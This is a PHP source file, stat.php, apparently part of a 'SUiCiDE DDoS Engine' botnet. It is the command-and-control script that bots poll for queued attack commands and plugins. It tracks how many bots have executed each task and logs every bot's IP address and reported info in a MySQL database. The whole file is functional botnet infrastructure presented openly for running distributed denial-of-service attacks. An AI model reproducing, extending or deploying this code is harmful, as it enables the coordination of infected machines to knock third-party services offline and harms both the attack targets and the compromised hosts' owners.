<?
/*************************************

     SUiCiDE DDoS Engine
     module: stat.php
     (c) Cr4sh
     www.cr4sh.h15.ru

**************************************/

   include "options.php";

   global $mysql;

   $act = addslashes($_GET['act']);
   $nick = addslashes($_GET['nick']);
   $info = addslashes($_GET['info']);

// _____________________________________________________________________________
// Connect to MySQL server

   if (@!mysql_connect($mysql['host'], $mysql['user'], $mysql['pass']))
        return;

   if (@!mysql_select_db($mysql['dbname']))
        return;
// _____________________________________________________________________________
// Logining bot info


/* plugins list ******************/
   if ($act == "getplugins")
   {
        $r = mysql_query("select * from plugins");

        for ($i = 0; $i < mysql_num_rows($r); $i++)
        {
             echo mysql_result($r, $i, 0)." ";
             //if (mysql_num_rows($r) > $i+1) echo ";";
        }
        exit();
   }

/* return command ****************/

   $r = mysql_query("select * from tasks where nick='$nick'");

   if (mysql_num_rows($r) == 0)
   {
        $r = mysql_query("select * from tasks where nick='mass'");
   }
   if (mysql_num_rows($r) == 1)
   {
        $f = mysql_fetch_array($r);
        if ($f['bnum'] > 0 && $f['executed'] >= $f['bnum'])
              $command = "wait";
        else
              $command = $f['command'];
   }
   else $command = "wait";

/* loginning bot info ************/

   if(!$nick || !$info)
        return;

   $ip = getenv("REMOTE_ADDR");
   $date = time();

   $r = mysql_query("select command from stat where nick='$nick'");
   $found = mysql_num_rows($r);

   if ($command === mysql_result($r, 0, 0))
        echo("wait");
   else {
        echo $command;
        if ($f['nick'])
              mysql_query("update tasks set executed=executed+1 where nick='".$f['nick']."'");
   }

   if ($found == 0)
   {
        mysql_query("insert into stat values ('$nick', '$ip', '$date', '$command', '$info')");
   } else {
        mysql_query("update stat set time='$date', command='$command', ip='$ip', info='$info' where nick='$nick'");
   }

?>